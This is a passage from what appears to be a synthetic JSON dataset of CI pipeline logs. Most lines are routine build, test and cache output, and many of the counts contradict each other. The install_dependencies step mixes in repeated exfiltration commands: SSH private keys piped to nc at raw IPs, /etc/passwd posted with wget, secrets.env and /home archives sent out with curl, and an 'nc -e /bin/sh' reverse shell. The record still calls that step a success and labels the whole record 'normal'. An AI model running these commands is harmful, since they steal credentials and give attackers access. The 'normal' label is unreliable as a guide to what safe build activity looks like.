          "Success!",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Done.",
          "Uploading artifact 'dist' (19 files)",
          "[12:18:24] INFO: Processing request",
          "[12:18:24] DEBUG: Loading configuration",
          "yarn add: Done in 11.54s",
          "npm install: added 154 packages",
          "Cache miss for key-3690",
          "  PASS: test_auth_login (306ms)",
          "Compiling lib/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "\u2713 package completed",
          "\u2713 Task completed in 454ms",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (12MB)",
          "NODE_ENV=production",
          "Connecting to test.io:443...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-30T12:20:13.700573",
        "finished_at": "2025-11-30T12:20:25.042371",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache invalidated: dependencies",
          "Uploading artifact 'coverage' (1 files)",
          "Using Python 3.12",
          "Artifact downloaded: 25MB",
          "Building Docker image...",
          "HEAD is now at 3e8ed72",
          "\u2713 build completed",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Compiling components/utils.go...",
          "\u2713 All checks passed",
          "Step 4/19: Deploying",
          "Cache restored successfully (278MB)",
          "Bundling vendor.css",
          "  PASS: unit/test_auth_login.spec.js",
          "Completed.",
          "Cache invalidated: build",
          "Processing...",
          "Cache miss for key-2473",
          "Minifying app.js",
          "Success!",
          "Ran 97 tests in 4s",
          "Cache hit for key-7015",
          "HEAD is now at e7dd63f",
          "Building Docker image...",
          "pip: Downloading lodash-5.5.tar.gz",
          "Compiling utils/index.js...",
          "  PASS: test_db_connect (249ms)",
          "Layer 6/13: COPY command",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] INFO: Processing request",
          "\u2713 Step 'build' succeeded",
          "WARNING: express has known vulnerabilities",
          "[12:18:24] INFO: Request completed",
          "Test Suites: 15 passed, 30 total",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Time: 46.969s",
          "[12:18:24] INFO: Cache refreshed",
          "TLS handshake completed",
          "[12:18:24] INFO: Cache refreshed",
          "Step 5/15: Building",
          "[12:18:24] DEBUG: Initializing service",
          "npm install: added 67 packages",
          "Building Docker image...",
          "[12:18:24] DEBUG: Initializing service",
          "Checking out main branch",
          "Creating production build...",
          "Transforming 815 files...",
          "Step 18/20: Building",
          "OK",
          "Image pulled successfully",
          "Ran 35 tests in 55s",
          "FAILED: test_api_health",
          "POST /api - 200 (174ms)",
          "[12:18:24] INFO: Connecting to database",
          "Environment: production",
          "Tests: 57 passed, 61 total",
          "Cache hit for key-1110",
          "  PASS: unit/test_cache_hit.spec.js",
          "Using Node.js 14.2.5",
          "Time: 107.458s",
          "Step 20/23: Running migrations",
          "[12:18:24] INFO: Starting build process",
          "npm notice: package.json updated",
          "Processing...",
          "Transforming 762 files...",
          "Installing axios@2.9.1",
          "Image pulled successfully",
          "npm install: added 328 packages",
          "\u2713 Task completed in 2868ms",
          "[12:18:24] INFO: Connecting to database",
          "GET /api - 200 (85ms)",
          "Switched to branch 'feature/task-963'",
          "[12:18:24] INFO: Request completed",
          "POST /upload - 200 (119ms)",
          "Step 7/15: Testing",
          "Compiling components/utils.go...",
          "HEAD is now at a261930",
          "Tests: 143 passed, 493 total",
          "Connecting to startup.dev:443...",
          "  PASS: test_db_connect (36ms)",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "POST /data - 201 (197ms)",
          "Using Node.js 16.8.6",
          "TLS handshake completed",
          "Uploading artifact 'dist' (44 files)",
          "Ran 117 tests in 54s",
          "GET /api - 200 (13ms)",
          "Time: 57.711s",
          "Loading...",
          "[12:18:24] INFO: Request completed",
          "\u2713 Step 'build' succeeded",
          "[12:18:24] INFO: Cache refreshed",
          "Image pulled successfully",
          "OK",
          "Transforming 188 files...",
          "NODE_ENV=production",
          "Ran 31 tests in 40s",
          "TLS handshake completed",
          "Verifying...",
          "pip install: Successfully installed webpack-4.1",
          "Generating source maps...",
          "pip: Collecting jest",
          "yarn add: Done in 1.28s",
          "TLS handshake completed",
          "Optimizing 23 modules...",
          "[12:18:24] INFO: Processing request",
          "Using Node.js 19.20.10",
          "Step 3/20: Testing",
          "Step 9/20: Linting",
          "\u2713 deploy completed",
          "Environment: production",
          "Connecting to cloud.services:443...",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Loading...",
          "Step 5/25: Installing dependencies",
          "Pulling image: alpine:3.11",
          "[12:18:24] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Step 11/22: Installing dependencies",
          "WARNING: jest has known vulnerabilities",
          "npm install: added 338 packages",
          "Connection established",
          "Layer 4/13: COPY command",
          "Cache hit for key-9223",
          "Verifying...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:24] DEBUG: Connection pool: 14 active",
          "GET /health - 204 (3ms)",
          "Cache invalidated: dependencies",
          "POST /upload - 202 (489ms)",
          "Minifying app.js",
          "[12:18:24] INFO: Request completed",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:24] INFO: Request completed",
          "Image pulled successfully",
          "Bundling main.css",
          "pip: Collecting lodash",
          "Connection established",
          "[12:18:24] DEBUG: Loading configuration",
          "Done.",
          "yarn add: Done in 6.15s",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-30T12:20:25.042371",
        "finished_at": "2025-11-30T12:20:59.067765",
        "log_lines": [
          "=== Step: build ===",
          "POST /data - 201 (315ms)",
          "Fetching submodules...",
          "Done.",
          "Processing...",
          "Generating source maps...",
          "Generating source maps...",
          "[12:18:24] DEBUG: Memory usage: 869MB",
          "Compiling components/app.ts...",
          "Tests: 113 passed, 293 total",
          "Checking out develop branch",
          "\u2713 deploy completed",
          "[12:18:24] DEBUG: Query executed in 9ms",
          "[12:18:24] WARN: Deprecated API usage",
          "Step 6/21: Deploying",
          "pip: Downloading lodash-3.0.tar.gz",
          "Fetching submodules...",
          "Fetching submodules...",
          "Fetching submodules...",
          "Test Suites: 39 passed, 7 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Building Docker image...",
          "Success!",
          "[12:18:24] DEBUG: Query executed in 95ms",
          "\u2713 package completed",
          "Step 15/17: Building",
          "Completed.",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "Step 13/22: Installing dependencies",
          "Step 20/15: Testing",
          "Artifact uploaded: dist.zip (22MB)",
          "[12:18:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Generating source maps...",
          "pip: Downloading react-5.15.tar.gz",
          "npm install: added 168 packages",
          "  PASS: integration/test_cache_hit.spec.js",
          "Pulling image: alpine:latest",
          "Bundling runtime.js",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Done.",
          "\u2713 deploy completed",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Step 5/15: Linting",
          "Environment: development",
          "Waiting...",
          "Building Docker image...",
          "Ready.",
          "Connecting to test.io:443...",
          "Step 16/17: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "HEAD is now at 7060f76",
          "\u2713 Step 'setup' succeeded",
          "Success!",
          "Platform: win32-x64",
          "Loading...",
          "[12:18:24] INFO: Starting build process",
          "  PASS: test_api_health (477ms)",
          "Step 4/15: Linting",
          "Snapshots: 27 passed, 24 total",
          "Transforming 694 files...",
          "Compiling src/handler.rs...",
          "[12:18:24] DEBUG: Connection pool: 15 active",
          "npm install: added 393 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: win32-x64",
          "Test Suites: 42 passed, 22 total",
          "GET /health - 200 (92ms)",
          "Compiling utils/service.java...",
          "npm install: added 138 packages",
          "HEAD is now at 208ac65",
          "Step 20/16: Testing",
          "Artifact uploaded: dist.zip (59MB)",
          "Transforming 710 files...",
          "Generating source maps...",
          "Processing...",
          "Building Docker image...",
          "Platform: darwin-arm64",
          "Test Suites: 50 passed, 12 total",
          "[12:18:24] DEBUG: Loading configuration",
          "Already up to date.",
          "Optimizing 60 modules...",
          "Optimizing 75 modules...",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:24] DEBUG: Memory usage: 675MB",
          "\u2713 Task completed in 4105ms",
          "Finished.",
          "npm install: resolved 1005 packages",
          "Compiling utils/main.py...",
          "Processing...",
          "Bundling main.css",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 2151ms",
          "Step 14/15: Linting",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] DEBUG: Initializing service",
          "pip: Downloading webpack-3.17.tar.gz",
          "\u2717 build failed with exit code 24",
          "Step 5/19: Running migrations",
          "Compiling components/index.js...",
          "Transforming 420 files...",
          "[12:18:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_db_connect",
          "[12:18:24] DEBUG: Query executed in 72ms",
          "Uploading artifact 'dist' (7 files)",
          "Artifact uploaded: dist.zip (46MB)",
          "[12:18:24] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (47 files)",
          "[12:18:24] DEBUG: Memory usage: 913MB",
          "[12:18:24] DEBUG: Memory usage: 1852MB",
          "npm notice: package.json updated",
          "Uploading artifact 'coverage' (4 files)",
          "[12:18:24] INFO: Request completed",
          "Waiting...",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-679'",
          "[12:18:24] ERROR: Connection failed",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] ERROR: Connection failed",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Platform: darwin-arm64",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "Cache restored successfully (63MB)",
          "\u2713 All checks passed",
          "Bundling vendor.js",
          "\u2717 build failed with exit code 52",
          "Test Suites: 8 passed, 42 total",
          "Creating production build...",
          "NODE_ENV=development",
          "[12:18:24] DEBUG: Memory usage: 1496MB",
          "TLS handshake completed",
          "[12:18:24] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 8/19: Linting",
          "Layer 6/15: ENV command",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-30T12:20:59.067765",
        "finished_at": "2025-11-30T12:21:10.409563",
        "log_lines": [
          "=== Step: setup_node ===",
          "HEAD is now at 690917c",
          "\u2713 package completed",
          "Completed.",
          "Using Node.js 18.15.8",
          "Platform: win32-x64",
          "Time: 73.174s",
          "Image pulled successfully",
          "\u2717 build failed with exit code 120",
          "Completed.",
          "Processing...",
          "NODE_ENV=development",
          "Image pulled successfully",
          "Bundling styles.js",
          "Step 10/17: Testing",
          "  PASS: test_auth_login (498ms)",
          "Switched to branch 'hotfix/task-583'",
          "Cache saved successfully",
          "Layer 8/11: COPY command",
          "[12:18:24] DEBUG: Query executed in 5ms",
          "Generating source maps...",
          "Processing...",
          "Minifying vendor.js",
          "Compiling lib/index.js...",
          "[12:18:24] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 106 passed, 328 total",
          "Uploading artifact 'dist' (47 files)",
          "Finished.",
          "yarn add: Done in 30.18s",
          "Creating production build...",
          "Tests: 273 passed, 176 total",
          "npm notice: created a lockfile",
          "Compiling utils/app.ts...",
          "Step 6/15: Installing dependencies",
          "Already up to date.",
          "Pulling image: alpine:latest",
          "Transforming 819 files...",
          "Time: 58.894s",
          "\u2713 Step 'checkout' succeeded",
          "Test Suites: 14 passed, 19 total",
          "Using Node.js 14.20.3",
          "Fetching submodules...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 580 files...",
          "Artifact downloaded: 50MB",
          "[12:18:24] WARN: Deprecated API usage",
          "Bundling runtime.css",
          "NODE_ENV=development",
          "Finished.",
          "\u2717 build failed with exit code 60",
          "Platform: win32-x64",
          "Tests: 467 passed, 304 total",
          "GET /status - 204 (4ms)",
          "Uploading artifact 'build' (33 files)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2717 build failed with exit code 7",
          "TLS handshake completed",
          "Optimizing 34 modules...",
          "Processing...",
          "Bundling runtime.js",
          "Already up to date.",
          "Layer 1/10: ENV command",
          "[12:18:24] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Compiling components/app.ts...",
          "pip install: Successfully installed webpack-4.18",
          "Using Node.js 19.0.1",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 All checks passed",
          "Cache miss for key-1845",
          "Using Node.js 14.11.6",
          "Ran 20 tests in 34s",
          "[12:18:24] ERROR: Connection failed",
          "Already up to date.",
          "[12:18:24] INFO: Cache refreshed",
          "Installing jest@5.10.0",
          "[12:18:24] DEBUG: Connection pool: 10 active",
          "Exception: RuntimeError",
          "[12:18:24] INFO: Request completed",
          "Exception: ValueError",
          "Checking out master branch",
          "Already up to date.",
          "Cache miss for key-2070",
          "Creating production build...",
          "Generating source maps...",
          "yarn add: Done in 16.70s",
          "Minifying app.js",
          "Done.",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "\u2713 Step 'checkout' succeeded",
          "Coverage: 70% statements, 68% branches",
          "Already up to date.",
          "Step 20/20: Running migrations",
          "[12:18:24] DEBUG: Connection pool: 2 active",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (55MB)",
          "pip: Installing build dependencies...",
          "Step 3/18: Running migrations",
          "\u2713 Task completed in 1140ms",
          "Uploading artifact 'dist' (7 files)",
          "[12:18:24] INFO: Processing request",
          "npm install: resolved 578 packages",
          "npm notice: package.json updated",
          "Step 13/24: Running migrations",
          "Success!",
          "[12:18:24] DEBUG: Memory usage: 1570MB",
          "Creating production build...",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "Bundling vendor.css",
          "Using Python 3.9",
          "Cache miss for key-2992",
          "Artifact downloaded: 31MB",
          "Platform: win32-x64",
          "Coverage: 91% statements, 63% branches",
          "Environment: production",
          "Step 11/17: Deploying",
          "[12:18:24] INFO: Request completed",
          "HEAD is now at 96ab84f",
          "WARNING: jest has known vulnerabilities",
          "Waiting...",
          "Coverage: 98% statements, 92% branches",
          "Ready.",
          "WARNING: jest has known vulnerabilities",
          "Using Node.js 18.11.4",
          "Completed.",
          "[12:18:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting axios",
          "npm notice: created a lockfile",
          "  PASS: test_api_health (88ms)",
          "[12:18:24] DEBUG: Query executed in 90ms",
          "Processing...",
          "Using Node.js 14.7.0",
          "pip install: Successfully installed axios-5.2",
          "Artifact uploaded: build.tar.gz (17MB)",
          "npm install: resolved 1886 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "Step 11/21: Installing dependencies",
          "[12:18:24] DEBUG: Query executed in 56ms",
          "Cache restored successfully (392MB)",
          "Checking out develop branch",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-30T12:21:10.409563",
        "finished_at": "2025-11-30T12:21:44.434957",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 64.254.171.19 48629",
          "=== Step: install_dependencies ===",
          "Cache saved successfully",
          "Test Suites: 7 passed, 19 total",
          "Done.",
          "Compiling lib/service.java...",
          "Connection established",
          "Step 4/20: Building",
          "Optimizing 10 modules...",
          "HEAD is now at 7513eb5",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 198.187.129.20 46492",
          "Installing axios@3.6.5",
          "Cache hit for key-8607",
          "Sending 35MB of data to example.com",
          "Fetching submodules...",
          "Creating production build...",
          "Minifying vendor.js",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Snapshots: 3 passed, 31 total",
          "Using Python 3.10",
          "Compiling src/main.py...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Switched to branch 'hotfix/task-417'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Step 10/24: Testing",
          "Step 19/16: Linting",
          "[12:18:24] INFO: Processing request",
          "POST /api - 202 (296ms)",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (33MB)",
          "[12:18:24] DEBUG: Connection pool: 16 active",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 45.197.156.184 42375",
          "Artifact downloaded: 16MB",
          "Connection established",
          "Connection established",
          "Pulling image: alpine:18",
          "Pulling image: python:18",
          "Sending 382MB of data to cloud.services",
          "yarn add: Done in 16.49s",
          "Step 1/17: Testing",
          "Pulling image: node:latest",
          "Pushing to registry...",
          "Verifying...",
          "[12:18:24] DEBUG: Loading configuration",
          "[12:18:24] DEBUG: Connection pool: 20 active",
          "Layer 7/8: COPY command",
          "[12:18:24] INFO: Connecting to database",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:24] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "nc -e /bin/sh 69.203.203.161 38122",
          "Sending 30MB of data to test.io",
          "Success!",
          "yarn add: Done in 24.23s",
          "npm notice: package.json updated",
          "Step 1/21: Deploying",
          "Using Python 3.11",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "  PASS: test_user_create (31ms)",
          "Compiling components/main.py...",
          "Sending 233MB of data to cloud.services",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 7.188.115.230 2736",
          "Environment: production",
          "Step 11/17: Installing dependencies",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/index.js...",
          "Step 20/20: Deploying",
          "Creating production build...",
          "Cache restored successfully (467MB)",
          "[12:18:24] INFO: Cache refreshed",
          "Step 3/19: Deploying",
          "OK",
          "Installing eslint@3.1.4",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] WARN: Deprecated API usage",
          "Bundling vendor.css",
          "pip: Installing build dependencies...",
          "Done.",
          "\u2713 deploy completed",
          "[12:18:24] WARN: Deprecated API usage",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Minifying app.js",
          "Switched to branch 'hotfix/task-461'",
          "[12:18:24] WARN: Deprecated API usage",
          "  PASS: unit/test_db_connect.spec.js",
          "OK",
          "Cache restored successfully (346MB)",
          "Verifying...",
          "Connecting to example.com:443...",
          "\u2713 validate completed",
          "Compiling src/handler.rs...",
          "[12:18:24] INFO: Request completed",
          "Ready.",
          "\u2713 package completed",
          "Image pulled successfully",
          "HEAD is now at 41f34e8",
          "[12:18:24] INFO: Processing request",
          "Artifact downloaded: 16MB",
          "Success!",
          "Step 13/20: Linting",
          "Step 20/22: Linting",
          "Minifying main.js",
          "Platform: linux-x64",
          "Compiling utils/app.ts...",
          "[12:18:24] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 9",
          "Uploading artifact 'build' (10 files)",
          "OK",
          "Pushing to registry...",
          "Step 2/20: Running migrations",
          "Installing eslint@2.20.5",
          "Step 19/21: Running migrations",
          "Cache invalidated: build",
          "Test Suites: 12 passed, 13 total",
          "pip: Collecting axios",
          "npm install: resolved 988 packages",
          "Layer 7/8: COPY command",
          "\u2713 deploy completed",
          "Completed.",
          "[12:18:24] INFO: Starting build process",
          "[12:18:24] INFO: Processing request",
          "Time: 69.529s",
          "Checking out develop branch",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Step 2/18: Building",
          "[12:18:24] INFO: Connecting to database",
          "Fetching submodules...",
          "Compiling src/service.java...",
          "\u2713 All checks passed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Environment: production",
          "[12:18:24] DEBUG: Loading configuration",
          "Coverage: 74% statements, 97% branches",
          "[12:18:24] DEBUG: Loading configuration",
          "Step 17/17: Building",
          "POST /data - 200 (452ms)",
          "Fetching submodules...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Sending 435MB of data to cloud.services",
          "Installing eslint@3.18.3",
          "Completed.",
          "Cache miss for key-8682",
          "Checking out main branch",
          "Time: 10.573s",
          "GET /api - 201 (1ms)",
          "Sending 244MB of data to cloud.services",
          "Step 20/20: Deploying",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Image pulled successfully",
          "[12:18:24] DEBUG: Initializing service",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "OK",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "[12:18:24] DEBUG: Initializing service",
          "Switched to branch 'hotfix/task-804'",
          "Connecting to cloud.services:443...",
          "[12:18:24] DEBUG: Loading configuration",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "  PASS: test_cache_hit (366ms)",
          "\u2717 build failed with exit code 103",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Already up to date.",
          "Connection established",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Ready.",
          "\u2713 build completed",
          "[12:18:24] INFO: Starting build process",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}